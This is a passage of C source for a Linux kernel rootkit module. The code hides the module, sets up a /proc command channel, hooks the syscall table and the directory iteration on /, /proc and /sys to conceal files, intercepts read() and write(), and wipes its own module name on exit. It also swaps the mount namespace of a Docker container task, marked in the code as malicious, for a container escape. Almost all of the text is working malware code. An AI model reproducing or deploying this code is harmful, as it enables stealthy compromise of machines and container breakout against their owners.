    if(parent_nsproxy != NULL){
        pr_info("Parent mnt_ns address: %p\n", parent_nsproxy->mnt_ns);
        if(!list_empty(&tsk->children)){
       	    struct task_struct *child;
            pr_info("Found the malicious container task\n");
            list_for_each_entry(child, &tsk->children, children){
                //lock the child task (i.e. the actual container)
		task_lock(child);
                //pr_info("PID of child: %u\n", child->pid);
		child_nsproxy = child->nsproxy;
		if(child_nsproxy != NULL){
		    pr_info("Malicious mnt_ns address BEFORE: %p\n", child_nsproxy->mnt_ns);
                    child->nsproxy = new_ns;
		    //Change the child's namespace address with the parent's ns address
		    //if(child->nsproxy->mnt_ns == 0x00007f1fa8f28722){
		    	//child->nsproxy->mnt_ns = 0x00007f5c27ecb722; //parent_nsproxy->mnt_ns;
      	            	// The next line is not necesary (function call) //
		    	//switch_task_namespaces(child, parent_nsproxy);
		    }
		    child_nsproxy = child->nsproxy;
		    pr_info("Malicious mnt_ns address AFTER: %p\n", child_nsproxy->mnt_ns);
		    task_unlock(child);
		}
	    }
        }

    	task_unlock(tsk);
	task_unlock(target_tsk);

    /*
    pr_info("Container namespace info: \n");
    pr_info("---------------------------\n");
    pr_info("mnt_ns address: %p\n", tsk->nsproxy->mnt_ns);
    pr_info("net_ns address: %p\n", tsk->nsproxy->net_ns);
    pr_info("pid_ns(for children) address: %p\n", tsk->nsproxy->pid_ns_for_children);
    pr_info("uts_ns address: %p\n", tsk->nsproxy->uts_ns);
    pr_info("ipc_ns address: %p\n", tsk->nsproxy->ipc_ns);
    */
}

/*
 * Access the namespaces of a Docker container. This is done through the
 * nsproxy structure of each container task (task_struct)
 * @return true on success, false on failure
*/
int access_namespaces(void){
    struct task_struct *task;
    char *tsk_name;
    struct task_struct *tsk_struct_list[1000];	//array of pointers to task_structs
    int container_count = 0;	//keep count of the number of containers running
    for_each_process(task){
        char *buf_comm = kmalloc(sizeof(task->comm), GFP_KERNEL);
        if(!buf_comm){
            return 0;
        }
        tsk_name = get_task_comm(buf_comm, task);
	//The CFG_DOCKER_CONTAINER constant is defined in our config.h file
        if(strcmp(tsk_name, CFG_DOCKER_CONTAINER) == 0){
            pr_info("Found containerd \"%s\" with task PID: %d\n", tsk_name, task->pid);
	    tsk_struct_list[container_count] = task;
            ++container_count;
	    //show_ns_pointers(task);
	}
        kfree(buf_comm);
    }
    show_ns_pointers(tsk_struct_list[container_count-2], tsk_struct_list[container_count-1]);
    pr_info("Total containers running: %d\n", container_count);
    return 1;
}

int init(void)
{
    pr_info("Module loaded\n");
    hide();
    protect();

    if (!setup_proc_comm_channel()) {
        pr_info("Failed to set up comm channel\n");
        unprotect();
        unhide();
        return -1;
    }

    pr_info("Comm channel is set up\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
    /*
     * The function get_fop is defined in this file, returns a pointer to the file operations table
     * of the file object located on the path passed as the function's argument.
     * Functions root_iterate, proc_iterate and sys_iterate are defined using macros in this
     * file above, macros names: FILLDIR_START(NAME), FILLDIR_END(NAME), READDIR(NAME), etc...
     */
    asm_hook_create(get_fop("/")->iterate, root_iterate);
    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    asm_hook_create(get_fop("/")->readdir, root_readdir);
    asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
    asm_hook_create(get_fop("/sys")->readdir, sys_readdir);

#endif
    /* Locate the system call table */
    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    /* Hook rmdir() syscall with our onw (i.e. asm_rmdir)
     * note: parameter __NR_rmdir is the position number inside the syscall table
     * associated with the rmdir  syscall. This is defined in <asm/unistd.h>
     */
    //asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
    //asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
    //asm_hook_create(sys_call_table[__NR_kill], asm_kill);
    //asm_hook_create(sys_call_table[__NR_chmod], asm_chmod);

    /* Hook read() and write() syscalls with our own */
    hook_create(&sys_call_table[__NR_read], read);
    hook_create(&sys_call_table[__NR_write], write);

    /* Functions to work with Docker containers */
    //list_tasks(); (not used for now)
    access_namespaces();

    return 0;
}

void exit(void)
{
    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
    pr_info("sys_read was called %lu times\n", read_count);
    pr_info("sys_write was called %lu times\n", write_count);

    hook_remove_all();
    asm_hook_remove_all();
    pid_remove_all();
    file_remove_all();

    THIS_MODULE->name[0] = 0;

    pr_info("Module removed\n");
}

module_init(init);
module_exit(exit);
